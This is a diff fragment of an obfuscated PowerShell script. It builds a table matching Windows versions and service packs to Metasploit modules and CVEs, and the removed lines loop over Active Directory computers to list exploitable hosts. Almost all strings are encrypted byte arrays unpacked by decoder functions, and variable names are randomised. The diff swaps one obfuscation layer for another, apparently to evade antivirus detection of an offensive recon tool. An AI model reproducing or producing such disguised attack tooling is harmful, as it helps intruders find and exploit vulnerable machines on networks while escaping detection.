-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(235,30,133,218,166,135,19,244,222,85,171,251,166,152,96,245,231,116,160,200,177,170,107,176,242,109,212,146) @(189,44,233,175,252,192,42,199)),"",(HandleResult95 @(12,32,124,165,251,17,65,100,182,218,111,75,117,133,172,61,26,39,182,227,26,75,90,166,192,63,65,96,177,227,23,76,76,168,216,100,54,37,235,236,12,32,70,186,250,17,19,41) @(86,120,20,210,153)),(HandleResult95 @(220,55,54,107,241,249,16,18,23,161,217,76,0,34,167,215,27,9,13,249,231,39,54,51,243,234,7,30,23,255,243,9,6,8,171,215,27,9,14,228,240,21,37,44,221,254,79,84,22,248,232,8) @(189,127,100,91,146)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(106,189,203,93,102,200,158,27,95,246,229,124,102,215,237,26,102,215,238,79,113,229,230,95,115,206,154,21) @(60,143,167,40)),"",(HandleResult95 @(173,22,122,165,149,9,43,162,147,13,43,225,150,25,39,185,149,125,118,168,187,125,92,166,174,39,43,166,148,52,83,231,175,52,83,227,186,8,43,168,149,25,91,171,175,124,39,190,173,124,43,226,150,25,84,226,173,24,43,191,147,25,39,184,175,124,126,167,173,9,68,230) @(247,78,18,210)),(HandleResult95 @(43,110,194,157,19,12,37,80,220,158,20,123,46,95,165,199,20,37,28,77,202,245,34,32,43,113,232,215,60,37,4,80,242,254,73,34,46,75,197,219,61,34,11,81,223,254,64,50,7,114,209,215) @(74,38,144,173,112,72)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(168,62,162,236,107,36,218,139,157,117,140,205,107,59,169,138,164,84,135,254,124,9,162,207,177,77,243,164) @(254,12,206,153,49,99,227,184)),"",(HandleResult95 @(144,50,90,78,135,141,83,66,93,166,243,89,83,110,208,161,8,1,93,159,134,89,124,77,188,163,83,70,90,159,143,29,106,67,164,248,39,100,0,159,169,45,11,79,135,130,36,72) @(202,106,50,57,229)),(HandleResult95 @(80,28,31,164,203,255,197,112,125,103,41,167,204,194,159,108,85,57,27,255,242,227,248,110,80,3,53,238,228,214,228,112,83,7,116,254,204,214,255,112,124,62,12,236,229,248,154,127,127,46,4,161) @(49,84,77,148,168,187,170,6)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(79,143,10,44,56,94,132,85,58,27,91,233,60,1,40,43,231,62,16,5,84,215,39,46,45,90,255,53,20,5,36,128) @(25,189,102,89,98)),"",(HandleResult95 @(7,132,32,207,79,26,229,56,220,110,100,239,41,239,24,54,190,123,220,87,17,239,6,204,116,52,229,60,219,87,24,171,16,194,108,111,145,30,129,87,62,155,113,206,79,21,146,50) @(93,220,72,184,45)),(HandleResult95 @(76,9,32,158,52,109,66,55,62,157,51,26,73,56,71,196,51,68,123,42,40,246,5,65,76,22,10,212,27,68,99,55,16,253,110,67,73,44,39,216,26,67,108,57,63,237,103,80,99,59,59,155) @(45,65,114,174,87,41)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(224,169,177,226,207,241,162,238,244,236,244,204,188,207,219,134,194,140,170,168) @(182,155,221,151,149)),(HandleResult95 @(201,82,48,9,248,13,48,9,213,38,36,24,197,82,21,23,209,49,91,77) @(156,96,102,112)),(HandleResult95 @(58,68,236,158,25,49,65,253,4,95,189,218,26,33,77,230,2,47,224,147,55,69,54,249,57,117,189,157,24,12,57,185,56,102,197,219,53,71,65,248,58,68,214,129,24,49,19,176) @(96,28,132,233,123,118,120,141)),(HandleResult95 @(235,211,30,240,13,200,229,237,0,243,10,191,238,226,121,170,10,225,220,240,22,152,60,228,235,204,52,186,34,225,196,237,46,147,87,230,238,246,25,182,35,230,203,236,3,131,94,188,199,241,25,183) @(138,155,76,192,110,140)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(45,4,185,222,254,247,88,72,85,172,233,243,209,57,53,6,140,250,153,141) @(123,54,213,171,164,176,97)),(HandleResult95 @(17,34,230,90,154,127,151,1,13,86,242,75,167,32,178,31,9,65,141,30) @(68,16,176,35,254,18,193,120)),(HandleResult95 @(109,170,37,108,85,181,116,107,83,177,116,40,86,165,120,112,85,193,41,97,123,193,3,111,110,155,116,111,84,136,12,46,111,136,12,42,122,180,116,97,85,165,4,98,111,192,120,119,109,192,116,43,86,165,11,43,109,164,116,118,83,165,120,113,111,192,33,110,109,181,27,47) @(55,242,77,27)),(HandleResult95 @(138,160,59,64,84,44,132,158,37,67,83,91,143,145,92,26,83,5,189,131,51,40,101,0,138,191,17,10,123,5,165,158,11,35,14,2,143,133,60,6,122,2,170,159,38,35,7,18,166,188,40,10) @(235,232,105,112,55,104)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(167,122,39,142,225,121,175,223,146,49,9,172,218,102,216,220,168,25,118,198) @(241,72,75,251,187,62,150,236)),(HandleResult95 @(185,131,100,168,231,223,186,200,123,151,193,218,181,131,65,182,206,227,209,140) @(236,177,50,209,131,178)),(HandleResult95 @(65,255,215,28,78,66,34,215,219,40,21,54,122,240,138,0,78,54,127,221,243,88,98,113,66,206,134,31,79,127,94,208,231,17,109,55,86,241,134,17,79,66,34,209,221,35,98,127) @(27,167,191,107,44,5)),(HandleResult95 @(235,145,43,219,235,206,182,15,167,187,238,234,29,146,189,224,189,20,189,227,208,129,43,131,233,221,161,3,167,229,196,175,27,184,177,224,189,20,190,254,199,179,56,147,197,201,233,0,165,242,195,236) @(138,217,121,235,136)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(154,38,22,205,145,139,45,73,219,178,142,67,27,224,133,252,77,43,133,246) @(204,20,122,184,203)),(HandleResult95 @(191,199,222,184,51,44,134,159,210,146,21,16,179,162,198,179,30,5,163,200) @(234,245,136,193,87,65)),(HandleResult95 @(247,154,7,18,207,133,86,21,201,129,86,86,204,149,90,14,207,241,11,31,225,241,33,17,244,171,86,17,206,184,46,80,245,184,46,84,224,132,86,31,207,149,38,28,245,240,90,9,247,240,86,85,204,149,41,85,247,148,86,8,201,149,90,15,245,240,3,16,247,133,57,81) @(173,194,111,101)),(HandleResult95 @(93,166,207,129,53,30,222,74,162,174,213,101,62,200,9,132,249,220,0,49,235,100,188,245,208,1,34,203,112,131,211,199,52,9,136,86,138,240,228,32,23,219,125,153,210,226,102,32,252,104,175,231) @(60,238,157,177,86,90,177)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(94,156,57,173,107,54,184,210,107,215,23,143,80,41,207,209,81,255,104,229) @(8,174,85,216,49,113,129,225)),(HandleResult95 @(38,13,175,150,93,89,31,85,163,188,123,101,42,104,183,157,112,112,58,2) @(115,63,249,239,57,52)),(HandleResult95 @(163,194,58,134,167,158,192,234,54,178,252,234,152,205,103,154,167,234,157,224,30,194,139,173,160,243,107,133,166,163,188,237,10,139,132,235,180,204,107,139,166,158,192,236,48,185,139,163) @(249,154,82,241,197,217)),(HandleResult95 @(145,216,210,216,54,205,159,230,204,219,49,186,148,233,181,130,49,228,166,251,218,176,7,225,145,199,248,146,25,228,190,230,226,187,108,227,148,253,213,158,24,227,177,232,205,171,101,240,190,234,201,221) @(240,144,128,232,85,137)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(0,138,124,127,12,255,41,57,53,193,82,93,55,224,94,58,15,233,45,55) @(86,184,16,10)),"",(HandleResult95 @(139,247,83,172,179,232,2,171,181,236,2,232,176,248,14,176,179,156,95,161,157,156,117,175,136,198,2,175,178,213,122,239,137,213,122,233,159,158,2,174,139,247,105,179,178,232,80,230) @(209,175,59,219)),(HandleResult95 @(201,12,202,34,42,236,43,238,94,122,204,119,252,107,124,194,32,245,68,34,242,28,202,122,40,255,60,226,94,36,230,50,250,65,112,194,32,245,71,63,229,46,217,101,6,235,116,168,95,35,253,51) @(168,68,152,18,73)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(32,162,203,174,103,45,79,163,196,162,127,61,23,200,233,235,100,59,75,173) @(118,144,167,219,61,106)),"",(HandleResult95 @(238,91,59,6,116,243,58,35,21,85,141,48,50,38,35,223,97,96,21,108,248,48,29,5,79,221,58,39,18,108,245,54,11,11,87,133,78,21,72,108,214,84,26,8,78,134,54,63,43,36,141,51,50,38,80,132,89,5,72,123,208,84,102,27,78,134,111,38,43,81,226,55) @(180,3,83,113,22)),(HandleResult95 @(163,36,180,127,165,141,18,161,142,95,130,124,162,176,72,189,166,1,176,36,156,145,47,191,163,59,158,53,138,164,51,161,160,63,223,37,162,164,40,161,143,6,167,56,137,154,77,173,143,56,167,53) @(194,108,230,79,198,201,125,215)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(138,240,158,43,188,180,229,241,145,39,164,170,137,131,207,99) @(220,194,242,94,230,243)),(HandleResult95 @(60,43,103,138,13,196,72,220,32,95,115,155,48,155,109,194,36,72,12,206) @(105,25,49,243,105,169,30,165)),(HandleResult95 @(45,232,247,40,69,48,137,239,59,100,78,131,254,8,18,28,210,172,59,93,59,130,205,53,125,47,250,232,6,94,78,196,252,37,102,13,232,229,30,94,57,220,166,52,126,69,137,235) @(119,176,159,95,39)),(HandleResult95 @(129,159,60,234,106,202,136,150,155,93,190,58,234,158,213,189,10,183,95,229,189,184,133,6,187,94,246,157,172,186,32,172,107,221,222,138,179,3,143,127,195,141,161,160,35,163,57,249,170,154,130,23,150,126,179,218) @(224,215,110,218,9,142,231)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(227,28,159,159,169,117,200,134,77,138,168,170,103,176,136,19) @(181,46,243,234,243,50,241)),(HandleResult95 @(12,86,66,3,61,9,66,3,16,34,86,18,0,86,103,29,20,53,41,71) @(89,100,20,122)),(HandleResult95 @(224,36,71,147,216,59,22,148,222,63,22,215,219,43,26,143,216,79,75,158,246,78,125,142,224,36,101,147,227,5,22,144,217,6,110,213,226,6,110,156,244,77,22,144,217,78,30,156) @(186,124,47,228)),(HandleResult95 @(233,2,192,37,203,87,53,254,6,161,113,155,119,35,189,32,246,120,254,120,0,208,24,250,116,255,107,32,196,39,220,99,202,64,99,226,46,255,64,222,94,48,201,61,220,70,152,100,23,204,31,167) @(136,74,146,21,168,19,90)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(132,81,193,96,186,149,90,158,118,153,144,58,248,84,221,239) @(210,99,173,21,224)),(HandleResult95 @(173,55,137,152,27,68,74,66,177,67,157,137,38,27,111,92,181,84,226,220) @(248,5,223,225,127,41,28,59)),(HandleResult95 @(74,53,32,139,5,87,84,56,152,36,41,94,41,171,82,123,15,123,152,29,92,94,6,136,62,121,84,60,159,29,81,93,16,134,38,104,32,30,197,20,115,95,14,134,4,103,80,117) @(16,109,72,252,103)),(HandleResult95 @(30,25,62,111,66,59,62,26,19,18,27,98,8,38,20,21,53,1,9,74,37,9,62,55,64,40,41,22,19,76,49,39,14,12,24,21,53,1,10,87,50,59,45,40,108,6,97,27,17,117,50,43,32,40,28,66) @(127,81,108,95,33)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(118,95,69,186,122,42,16,252,67,20,107,150,117,44,20,242) @(32,109,41,207)),(HandleResult95 @(185,66,164,123,16,158,13,160,165,54,176,106,45,193,40,190,161,33,207,63) @(236,112,242,2,116,243,91,217)),(HandleResult95 @(237,32,205,223,21,176,2,199,28,230,145,68,150,108,130,19,199,155,19,141,119,132,54,209,241,30,206,79,212,2,228,153,47,141,122,205,55,243,145,0,149,85,246,69) @(183,120,165,168,119,247,59)),(HandleResult95 @(42,66,153,175,191,195,222,238,7,57,175,172,184,254,132,242,47,103,157,244,134,223,227,240,42,93,179,229,144,234,255,238,41,89,242,245,184,234,228,238,6,96,138,232,146,212,129,224,4,94,172,229) @(75,10,203,159,220,135,177,152)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(64,27,185,209,119,81,16,230,199,84,84,112,128,229,16,43) @(22,41,213,164,45)),(HandleResult95 @(128,219,171,1,196,171,131,144,180,62,226,174,140,219,142,31,237,151,232,212) @(213,233,253,120,160,198)),(HandleResult95 @(50,115,183,116,61,95,81,91,187,64,102,43,9,124,234,104,61,43,12,81,147,48,17,108,49,66,230,119,60,98,41,25,135,121,30,40,37,109,230,118,5,64,58,67,188,68,52,37) @(104,43,223,3,95,24)),(HandleResult95 @(81,24,88,183,222,116,63,124,203,142,84,99,110,254,136,90,52,103,209,214,106,8,88,239,220,103,40,112,203,208,126,38,104,212,132,90,52,103,210,203,125,58,75,240,243,89,96,112,201,249,125,101) @(48,80,10,135,189)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(183,174,62,121,201,157,84,210,255,43,78,202,143,44,220,161) @(225,156,82,12,147,218,109)),(HandleResult95 @(195,82,177,58,242,58,250,10,189,16,212,6,207,55,169,49,223,19,223,93) @(150,96,231,67,150,87)),(HandleResult95 @(225,85,21,93,144,144,203,36,223,78,68,25,147,128,199,63,217,62,25,80,190,229,160,62,225,85,55,93,171,174,203,32,216,119,60,27,170,173,179,44,245,60,68,94,145,229,195,44) @(187,13,125,42,242,215,242,84)),(HandleResult95 @(123,169,211,106,78,249,117,151,205,105,73,142,126,152,180,48,73,208,76,138,219,2,127,213,123,182,249,32,97,208,84,151,227,9,20,215,126,140,212,44,96,215,91,150,207,9,29,202,87,165,212,111) @(26,225,129,90,45,189)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(173,175,34,205,116,144,51,9,152,228,12,225,123,150,55,7) @(251,157,78,184,46,215,10,58)),(HandleResult95 @(203,46,202,237,250,113,240,254,196,79,222,197,199,75,210,230,215,88,213,169) @(158,28,156,148)),(HandleResult95 @(232,177,165,47,208,174,244,40,214,170,244,107,211,190,248,51,208,218,169,34,254,218,131,44,235,128,244,44,209,147,140,106,234,147,140,104,255,175,244,45,232,177,159,48,209,174,166,101) @(178,233,205,88)),(HandleResult95 @(147,85,169,221,191,184,147,136,190,46,159,222,184,133,201,148,150,112,173,134,134,164,174,150,147,74,131,151,144,145,178,136,144,78,194,135,184,145,169,136,191,119,186,154,146,149,204,132,188,89,182,216) @(242,29,251,237,220,252,252,254)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(190,185,68,179,157,175,178,27,165,190,170,210,125,135,250,213) @(232,139,40,198,199)),(HandleResult95 @(19,201,139,182,34,150,177,165,28,168,159,158,31,172,147,189,15,191,148,242) @(70,251,221,207)),(HandleResult95 @(211,85,143,135,212,248,229,108,237,78,222,195,215,232,233,119,235,62,131,138,250,140,146,104,208,100,222,132,213,197,157,46,209,119,166,194,248,211,229,105,237,63,161,135,215,238,225,33) @(137,13,231,240,182,191,220,28)),(HandleResult95 @(92,37,208,179,94,41,237,245,113,94,230,176,89,20,183,233,89,0,212,232,103,53,208,235,92,58,250,249,113,0,204,245,95,62,187,233,89,0,215,245,112,7,195,244,115,4,178,179,115,7,229,183) @(61,109,130,131)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(100,223,27,192,104,170,78,134,81,148,53,236,103,172,74,136) @(50,237,119,181)),(HandleResult95 @(59,137,203,194,14,3,215,247,225,57,44,234,196,236,36,28,242,217,242,87) @(110,187,157,187,106)),(HandleResult95 @(15,5,255,78,226,18,100,231,93,195,108,110,246,110,181,62,63,164,93,250,25,110,217,77,217,60,100,227,90,250,20,111,207,67,193,102,16,209,0,179,52,110,217,67,228,56,16,170) @(85,93,151,57,128)),(HandleResult95 @(65,53,219,202,138,28,79,11,197,201,141,107,68,4,188,144,141,53,118,22,211,162,187,48,65,42,241,128,165,53,110,11,235,169,208,50,68,16,220,140,164,50,97,10,199,147,217,104,110,23,226,130) @(32,125,137,250,233,88)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(216,34,101,3,52,44,15,19,237,105,75,47,59,42,11,29) @(142,16,9,118,110,107,54,32)),(HandleResult95 @(139,3,17,228,186,92,43,247,132,98,5,204,135,102,9,239,151,117,14,160) @(222,49,71,157)),(HandleResult95 @(0,181,31,124,56,170,78,123,62,174,78,56,59,186,66,96,56,222,19,113,22,222,57,127,3,132,78,127,57,151,54,63,2,151,54,57,20,220,78,126,0,181,37,99,57,170,28,54) @(90,237,119,11)),(HandleResult95 @(170,60,221,45,168,48,224,107,135,71,235,46,175,13,186,119,175,25,217,118,145,44,221,117,170,35,247,103,135,25,193,107,169,39,182,119,175,25,218,107,134,30,206,106,132,55,191,45,134,30,218,106) @(203,116,143,29)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(154,122,205,43,193,175,245,123,194,39,217,177,153,9,156,99) @(204,72,161,94,155,232)),(HandleResult95 @(87,115,112,129,126,254,113,8,88,18,100,169,67,196,83,16,75,5,111,197) @(2,65,38,248,26,147,29,98)),(HandleResult95 @(180,144,155,114,73,153,215,184,151,70,18,237,143,159,198,110,73,237,138,178,191,54,101,170,183,161,202,113,72,164,171,191,171,127,106,236,163,158,202,127,72,153,215,190,145,77,101,164) @(238,200,243,5,43,222)),(HandleResult95 @(0,101,194,65,238,174,14,91,220,66,233,217,5,84,165,27,233,135,55,70,202,41,223,130,0,122,232,11,193,135,47,91,242,34,180,128,5,64,197,7,192,128,32,85,221,50,189,147,47,87,217,68) @(97,45,144,113,141,234)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(184,224,34,195,180,149,119,133,141,171,12,239,187,147,115,139) @(238,210,78,182)),(HandleResult95 @(81,82,188,125,73,105,12,128,94,126,70,49,179,83,99,118,41,174,73,16) @(4,96,234,4,45)),(HandleResult95 @(23,18,230,225,94,160,116,58,234,213,5,212,44,29,187,253,94,212,41,48,194,165,114,147,20,35,183,226,95,157,12,126,214,236,125,213,3,123,183,227,102,191,31,34,237,209,87,218) @(77,74,142,150,60,231)),(HandleResult95 @(233,174,200,43,108,163,231,144,214,40,107,212,236,159,175,113,107,138,222,141,192,67,93,143,233,177,226,97,67,138,198,144,248,72,54,141,236,139,207,109,66,141,201,145,213,88,63,215,197,140,207,108) @(136,230,154,27,15,231)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(67,192,63,55,160,87,44,193,48,59,184,73,64,179,110,127) @(21,242,83,66,250,16)),(HandleResult95 @(123,40,199,172,9,8,6,124,116,73,211,132,52,50,36,100,103,94,220,232) @(46,26,145,213,109,101,106,22)),(HandleResult95 @(157,84,166,99,64,116,224,183,104,141,45,17,82,142,242,103,172,39,70,73,149,244,66,186,77,75,10,173,164,118,139,99,122,73,152,245,65,152,45,88,80,158,254,122,172,92,108,73) @(199,12,206,20,34,51,217)),(HandleResult95 @(248,234,93,35,2,239,188,195,213,145,107,32,5,210,230,223,253,207,89,120,59,243,129,221,248,245,119,105,45,198,157,195,251,241,54,121,5,198,134,195,212,200,78,107,44,232,227,204,215,216,70,38) @(153,162,15,19,97,171,211,181)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(95,231,207,131,65,218,48,230,192,143,89,196,92,148,158,203) @(9,213,163,246,27,157)),"",(HandleResult95 @(157,139,191,169,160,128,234,167,186,129,254,224,182,137,247,172,177,228,186,184,139,225,133,180,152,159,153,160,135,187,254,167,180,164,131,189,139,173,159,187,137,191,238,181,155,245,234,163) @(199,211,215,222,194)),(HandleResult95 @(138,204,49,141,182,112,198,157,200,80,217,230,80,208,222,238,7,208,131,95,243,179,214,11,220,130,76,211,167,233,45,203,183,103,144,129,224,14,232,163,121,195,170,243,46,196,229,67,228,145,209,26,241,162,9,148) @(235,132,99,189,213,52,169)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(191,147,244,215,47,174,152,171,193,12,171,248,205,227,72,212) @(233,161,152,162,117)),"",(HandleResult95 @(253,235,230,93,245,128,33,10,195,240,183,25,246,144,45,17,197,128,234,80,219,245,74,16,253,235,196,93,206,190,33,14,196,201,207,27,207,189,89,2,233,130,183,94,244,245,41,2) @(167,179,142,42,151,199,24,122)),(HandleResult95 @(96,75,37,192,153,69,108,1,188,201,101,48,19,137,207,107,103,26,166,145,91,91,37,152,155,86,123,13,188,151,79,117,21,163,195,107,103,26,165,140,76,105,54,135,180,82,51,0,189,190,84,54) @(1,3,119,240,250)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(10,19,235,47,139,101,199,181,63,88,197,3,132,99,195,187) @(92,33,135,90,209,34,254,134)),"",(HandleResult95 @(31,108,9,249,39,115,88,254,33,119,88,189,36,99,84,229,39,7,5,244,9,7,47,250,28,93,88,250,38,78,32,188,29,78,32,190,8,114,88,251,31,108,51,230,38,115,10,179) @(69,52,97,142)),(HandleResult95 @(65,31,58,194,67,19,7,132,108,100,12,193,68,46,93,152,68,58,62,153,122,15,58,154,65,0,16,136,108,58,38,132,66,4,81,152,68,58,61,132,109,61,41,133,110,62,88,136,110,19,37,199) @(32,87,104,242)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(238,232,63,16,6,116,53,139,185,42,39,5,102,77,133,231) @(184,218,83,101,92,51,12)),"",(HandleResult95 @(232,83,59,223,33,86,139,123,55,235,122,34,211,92,102,195,33,34,214,113,31,155,13,101,235,98,106,220,32,107,243,63,11,210,2,35,252,58,106,221,25,73,224,99,48,239,40,44) @(178,11,83,168,67,17)),(HandleResult95 @(72,172,57,97,103,109,139,29,29,55,77,215,15,40,49,67,128,6,7,111,115,188,57,57,101,126,156,17,29,105,103,146,9,2,61,67,128,6,4,114,100,142,42,38,75,106,212,91,28,110,124,147) @(41,228,107,81,4)))  
-
-    # Status user        
-    Write-Verbose (HandleResult95 @(199,142,214,106,64,213,185,201,84,94,222,133,199,89,60,254,190,225,64,127,242,175,228,63,109,215,161,223,109,112,210,154,196,61,64,247,147,200,88,122,242,154,240,119,80,199,189,213,84,90,210,167,243,119,75,248,149,203,95,110,197,198,231,105,107,215,161,148,84,94,232,141,234,103,61,229) @(144,247,166,14,9))
-
-    # ----------------------------------------------------------------
-    # Setup data table to store vulnerable systems
-    # ----------------------------------------------------------------
-
-    # Create data table to house vulnerable server list
-    $xtVUYRm = New-Object System.Data.DataTable 
-    $Null = $xtVUYRm.Columns.Add('ComputerName')
-    $Null = $xtVUYRm.Columns.Add('OperatingSystem')
-    $Null = $xtVUYRm.Columns.Add('ServicePack')
-    $Null = $xtVUYRm.Columns.Add('LastLogon')
-    $Null = $xtVUYRm.Columns.Add('MsfModule')
-    $Null = $xtVUYRm.Columns.Add('CVE')
-
-    # Iterate through each exploit
-    $TH0cH8 | ForEach-Object {
-                 
-        $hWLX1YC = $_.OperatingSystem
-        $OScKXX = $_.ServicePack
-        $GCjJA = $_.MsfModule
-        $e66CU = $_.CVE
-
-        # Iterate through each ADS computer
-        $iqAC8a | ForEach-Object {
-            
-            $cEFZa = $_.Hostname
-            $MXTOqP6 = $_.OperatingSystem
-            $XpkpGYf = $_.ServicePack                                                        
-            $qnPA = $_.LastLogon
-            
-            # Add exploitable systems to vul computers data table
-            if ($MXTOqP6 -like ($hWLX1YC + "*") -and $XpkpGYf -like ($OScKXX) ) {                    
-                # Add domain computer to data table                    
-                $Null = $xtVUYRm.Rows.Add($cEFZa,$MXTOqP6,$XpkpGYf,$qnPA,$GCjJA,$e66CU)
+    Write-Verbose (ParseEntry20 @(59,175,69,124,252,47,63,26,143,98,74,197,8,42,15,177,111,64,221,29,37,43,239,69,124,246,40,52,13,142,123,40,252,45,29,26,181,92,90,223,9,42,0,230,84,79,251,2,37,47,148,65,121,237,36,61,13,129,0,118,252,34,5,4,178,114,86,218,48,31,33,163,121,113,129,87) @(108,214,53,24,181,106,71))
+    $ChwBZi = New-Object System.Data.DataTable 
+    $Null = $ChwBZi.Columns.Add('OperatingSystem') 
+    $Null = $ChwBZi.Columns.Add('ServicePack')
+    $Null = $ChwBZi.Columns.Add('MsfModule')  
+    $Null = $ChwBZi.Columns.Add('CVE')
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(1,59,115,201,13,78,38,143,52,112,94,143) @(87,9,31,188)),"",(ParseEntry20 @(47,19,28,146,134,33,76,59,16,166,221,85,20,28,65,142,134,85,17,49,56,214,170,18,44,34,77,145,135,28,48,60,44,159,165,84,56,29,77,159,135,33,76,61,22,173,170,28) @(117,75,116,229,228,102)),(ParseEntry20 @(241,172,194,13,243,160,255,75,220,215,244,14,244,157,165,87,244,137,198,86,202,188,194,85,241,179,232,71,220,137,222,75,242,183,169,87,244,137,197,75,221,142,209,69,221,167,160,68,222,158,217,8) @(144,228,144,61)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(105,134,123,24,221,123,6,135,116,20,197,104,101,236,93,95,221,100,118,211,90,7,198,75,114,245,42,80) @(63,180,23,109,135,60)),(ParseEntry20 @(154,11,147,244,34,218,208,15,134,127,135,229,31,133,245,17,130,104,248,176) @(207,57,197,141,70,183,134,118)),(ParseEntry20 @(207,86,206,77,73,125,172,126,194,121,18,9,244,89,147,81,73,9,241,116,234,8,121,80,207,86,236,77,114,67,172,122,197,64,106,64,205,116,231,67,101,86,172,101,255,8,18,78) @(149,14,166,58,43,58)),(ParseEntry20 @(67,102,162,174,36,202,77,88,188,173,35,189,70,87,197,244,35,227,116,69,170,198,21,230,67,121,136,228,11,227,108,88,146,205,126,228,70,67,165,232,10,228,99,89,189,231,119,249,111,84,165,231,11,249,31,19) @(34,46,240,158,71,142)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(114,0,190,236,101,176,130,30,71,75,144,205,101,175,241,31,126,106,155,254,114,157,250,90,105,115,239,164) @(36,50,210,153,63,247,187,45)),(ParseEntry20 @(97,36,64,197,229,89,64,111,245,199,118,126,79,142,242,83,91,71,129,188) @(52,22,22,188,129)),(ParseEntry20 @(246,121,9,245,206,102,88,242,200,98,88,177,205,118,84,233,206,18,5,248,224,19,51,232,246,121,43,245,245,88,88,246,207,91,32,179,244,91,32,250,226,16,88,246,207,19,80,250) @(172,33,97,130)),(ParseEntry20 @(225,200,43,221,222,43,238,184,204,179,29,222,217,22,180,164,228,237,47,134,231,55,211,166,225,215,1,151,241,2,207,184,226,211,64,135,217,2,212,184,205,234,56,154,243,60,177,185,205,196,44,216) @(128,128,121,237,189,111,129,206)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(250,17,3,28,78,230,149,16,12,16,86,245,246,123,37,91,78,249,229,68,34,3,85,214,225,98,82,84) @(172,35,111,105,20,161)),(ParseEntry20 @(96,48,209,40,0,209,99,123,206,23,38,212,108,48,244,54,41,237,8,63) @(53,2,135,81,100,188)),(ParseEntry20 @(61,254,196,55,5,225,149,48,3,229,149,115,6,241,153,43,5,149,200,58,43,148,192,48,4,223,149,52,4,220,237,58,63,220,237,55,41,151,149,53,3,225,254,51,5,224,149,115,61,241,230,43,62,254,245,125) @(103,166,172,64)),(ParseEntry20 @(49,28,112,7,31,104,80,38,24,17,83,79,72,70,101,62,70,90,42,71,101,8,6,74,86,43,84,69,28,57,108,65,30,127,6,58,48,79,98,10,97,85,17,35,111,78,76,91,114,4,21,23) @(80,84,34,55,124,44,63)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(139,10,96,194,89,2,228,11,111,206,65,17,135,96,70,133,89,29,148,95,65,221,66,50,144,121,49,138) @(221,56,12,183,3,69)),(ParseEntry20 @(228,107,147,73,226,220,15,188,121,192,243,49,156,2,245,214,20,148,13,187) @(177,89,197,48,134)),(ParseEntry20 @(175,81,239,54,89,178,48,247,37,120,204,58,230,22,14,158,107,180,37,65,185,58,227,49,89,155,68,241,35,99,184,126,201,7,3,130,71,195,23,93,145,59,235,52,88,130,52,186) @(245,9,135,65,59)),(ParseEntry20 @(137,192,26,37,190,9,135,254,4,38,185,126,140,241,125,127,185,32,190,227,18,77,143,37,137,223,48,111,145,32,166,254,42,70,228,39,140,229,29,99,144,39,169,255,6,86,237,53,165,204,47,98,145,58,213,181) @(232,136,72,21,221,77)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(37,14,188,60,134,91,74,15,179,48,158,72,41,100,154,123,134,68,58,91,157,35,157,107,62,125,237,116) @(115,60,208,73,220,28)),(ParseEntry20 @(173,21,216,90,63,149,75,228,121,8,186,118,215,116,21,138,110,202,106,102) @(248,39,142,35,91)),(ParseEntry20 @(254,149,204,171,152,170,250,212,169,231,229,201,140,148,145,166,198,239,158,151,143,150,159,206,134,162,167,180,253,180,157,168,153,151,130,222,149,222,157,131,163,175,157,166,253,238,195,153) @(164,205,164,220,250,237,195)),(ParseEntry20 @(110,130,233,235,17,119,131,121,134,136,191,65,87,149,58,160,223,182,36,88,182,87,152,211,186,37,75,150,67,167,245,173,16,96,213,101,174,214,142,4,126,134,78,189,246,162,66,68,161,117,159,194,151,5,14,209) @(15,202,187,219,114,51,236)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(158,124,37,253,191,137,104,251,45,48,202,177,148,9,130,124,19,208,172,169,28,162,15,62,197,164,243,108) @(200,78,73,136,229,206,81)),(ParseEntry20 @(84,231,51,2,31,3,61,254,91,134,39,42,34,57,31,230,72,145,44,70) @(1,213,101,123,123,110,81,148)),(ParseEntry20 @(149,139,13,67,159,214,246,163,1,119,196,162,174,132,80,95,159,162,171,169,41,6,175,251,149,139,47,67,164,232,246,167,6,78,188,160,151,169,36,76,179,160,246,167,6,6,204,233) @(207,211,101,52,253,145)),(ParseEntry20 @(82,145,254,175,29,119,182,218,211,77,87,234,200,230,75,89,189,193,201,21,105,129,254,247,31,100,161,214,211,19,125,175,206,204,71,89,189,193,202,8,126,179,237,232,48,96,233,219,210,58,102,236) @(51,217,172,159,126)))  
